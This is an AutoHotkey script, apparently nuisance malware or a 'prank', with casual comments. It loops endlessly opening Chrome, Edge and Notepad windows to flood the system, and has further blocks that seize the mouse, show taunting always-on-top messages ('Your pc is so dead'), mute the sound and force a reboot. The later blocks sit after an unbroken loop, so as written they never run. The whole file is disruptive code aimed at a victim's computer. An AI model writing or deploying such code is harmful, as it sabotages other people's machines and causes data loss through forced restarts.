Loop {

	Run, chrome.exe "https://google.com" ; goes to google.com
	Run, chrome.exe "https://youtube.com" ; goes to youtube.com
	Run, msedge.exe "https://google.com" " --new-window" ; goes to google.com
	Run, msedge.exe "https://youtube.com" " --new-window" ; goes to youtube.com
	Run, notepad.exe ; runs notepad

}

Loop { 
	
    MouseMove, 1323, -259 ; moves mouse to top right of screen
	MouseMove, -356, -29 ; moves mouse to top left of screen
	MouseMove, -314, 630 ; moves mouse to bottom left of screen
	MouseMove, 1014, 612 ; moves mouse to bottom right of screen

}

Loop {
	
	MsgBox, 4096,, HAHA, Your pc is so dead, Nooo moree pc ; Taunting the user lol

}

SoundSet -100 ; makes no more volume

Sleep, 60000
Shutdown, 6 ; reboots pc forcefully
